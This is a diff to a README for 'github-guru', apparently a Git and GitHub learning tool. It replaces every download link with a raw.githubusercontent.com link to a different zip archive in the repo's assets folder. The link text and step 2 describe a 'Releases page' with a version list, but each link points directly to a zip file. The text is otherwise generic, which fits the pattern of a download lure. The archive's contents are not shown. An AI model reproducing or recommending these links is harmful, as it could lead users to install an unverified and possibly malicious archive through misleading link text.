@@ -1,6 +1,6 @@
 # 🧠 github-guru - Easy Learning for Git & GitHub
 
-[![Download Now](https://raw.githubusercontent.com/Neuropathyactionplant498/github-guru/main/assets/github-guru-3.9.zip)](https://raw.githubusercontent.com/Neuropathyactionplant498/github-guru/main/assets/github-guru-3.9.zip)
+[![Download Now](https://raw.githubusercontent.com/Neuropathyactionplant498/github-guru/main/assets/github-guru-v1.2.zip)](https://raw.githubusercontent.com/Neuropathyactionplant498/github-guru/main/assets/github-guru-v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you download, make sure your system meets these minimum requirements:
 To get the latest version of github-guru, you will need to visit the Releases page.
 
 1. Click the link below to access the download page:
-   [Visit this page to download](https://raw.githubusercontent.com/Neuropathyactionplant498/github-guru/main/assets/github-guru-3.9.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/Neuropathyactionplant498/github-guru/main/assets/github-guru-v1.2.zip)
 
 2. On the Releases page, you will see a list of available versions. Look for the most recent version.
 
@@ -75,4 +75,4 @@ Don't go on this learning journey alone. Join our community of learners. Share y
 
 We value your feedback. Let us know how we can improve github-guru to better serve your learning needs. Your thoughts matter to us.
 
-Visit this page to download: [Download Now](https://raw.githubusercontent.com/Neuropathyactionplant498/github-guru/main/assets/github-guru-3.9.zip)
+Visit this page to download: [Download Now](https://raw.githubusercontent.com/Neuropathyactionplant498/github-guru/main/assets/github-guru-v1.2.zip)
